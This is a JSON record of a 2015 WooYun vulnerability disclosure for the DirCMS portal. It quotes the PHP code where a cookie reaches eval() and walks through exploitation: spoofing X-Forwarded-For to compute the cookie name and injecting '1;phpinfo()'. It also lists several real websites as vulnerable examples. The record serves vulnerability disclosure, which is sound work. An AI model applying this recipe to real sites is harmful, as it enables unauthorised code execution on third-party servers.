{"id": 33138, "wybug_id": "wooyun-2015-0109523", "wybug_title": "dircms门户系统前台getshell(附exp)", "wybug_corp": "dircms", "wybug_author": "牛肉包子", "wybug_date": "2015-04-24 16:15", "wybug_open_date": "2015-06-08 16:16", "wybug_type": "设计缺陷/逻辑错误", "wybug_level": "高", "wybug_rank_0": "20", "wybug_status": "未联系到厂商或者厂商积极忽略", "wybug_from": "http://www.wooyun.org", "wybug_tags": ["源码分析"], "wybug_detail": "漏洞详情 披露状态：   \t\t\t\t\t\t\t\t\t2015-04-24：\t积极联系厂商并且等待厂商认领中，细节不对外公开\t\t\t\t\t\t\t\t\t2015-06-08：\t厂商已经主动忽略漏洞，细节向公众公开  简要描述： rt 详细说明：  看到/include/global.func.php\nfunction string2array($str){\tif(disablefunc('eval'))exit('函数eval被禁用,可能无法正常使用本系统!');\tif($str=='') return array();\tif(is_array($str))return $str;\t@eval(\"\\$array = $str;\");\treturn $array;}\n这个函数可能会造成任意代码执行，然后看看哪里调用了这个函数然后看到/pay/order.php\ninclude substr(dirname(__FILE__),0,-3).'include/common.inc.php';if($module->module_disabled('pay')){\tshow404('该模块已被管理员禁用!');}include DIRCMS_ROOT.'pay/include/global.func.php';include DIRCMS_ROOT.'pay/include/pay.class.php';$payobj=new pay();$action=isset($action)?$action:'step1';session_start();$cookiekey=dircms_md5('productarray'.IP);$productarray=string2array(get_cookie($cookiekey));\n然后跟进dircms_md5\nfunction dircms_md5($str){\treturn substr(md5($str),8,16);}\n其中ip为可控的\nfunction getIp(){\t$ip='未知IP';\tif(!empty($_SERVER['HTTP_CLIENT_IP']))\t{\t\treturn is_ip($_SERVER['HTTP_CLIENT_IP'])?$_SERVER['HTTP_CLIENT_IP']:$ip;\t}\telseif(!empty($_SERVER['HTTP_X_FORWARDED_FOR']))\t{\t\treturn is_ip($_SERVER['HTTP_X_FORWARDED_FOR'])?$_SERVER['HTTP_X_FORWARDED_FOR']:$ip;\t}\telse\t{\t\treturn is_ip($_SERVER['REMOTE_ADDR'])?$_SERVER['REMOTE_ADDR']:$ip;\t}}\n可以通过xxf伪造，然后就可以造成任意代码执行了。首先找个站点\nhttp://www.qzdszx.net\n首先访问\nhttp://www.qzdszx.net/pay/order.php?action=step1\n获得cookie前缀\nLadfOyQtuF\n，然后设置xff为0.0.0.0构造cookie名为\nLadfOyQtuFb98b87d11653f2da\n，内容为\n1;phpinfo()\n然后刷新\n\n代码成功执行。   漏洞证明：  \n\n案例\nhttp://www.qzdszx.net/pay/order.php\n\nhttp://www.cnbonds.com/pay/order.php\n\nhttp://www.99lao.com/pay/order.php\n\nhttp://www.tywcn.com/pay/order.php\n\nhttp://www.0351mh.com/pay/order.php\n\nhttp://www.0314chengde.com/pay/order.php\n\nhttp://www.wusumenhu.com/pay/order.php\n   修复方案：  你们专业   版权声明：转载请注明来源 牛肉包子@乌云\n ", "wybug_reply": "漏洞回应  厂商回应： 未能联系到厂商或者厂商积极拒绝  ", "replys": "漏洞评价：\n评论\n     2015-05-21 16:06 |    \t\tsco4x0 \t\t\t( 实习白帽子  |\t\t\t        Rank:31 漏洞数:13        | O_o)\t\t \n  然而我可能知道详情了    \n     2015-06-13 13:59 |    \t\tSion \t\t\t( 路人 |\t\t\t        Rank:21 漏洞数:4        )\t\t \n  然而我可能知道详情了    \n     2015-07-06 23:49 |    \t\tSword \t\t\t( 路人 |\t\t\t        Rank:16 漏洞数:11        | 求大牛带飞)\t\t \n  66666    \n  \n\n\n", "wybug_level_fromcorp": "无影响厂商忽略", "wybug_rank_fromcorp": 0, "Ranks": null}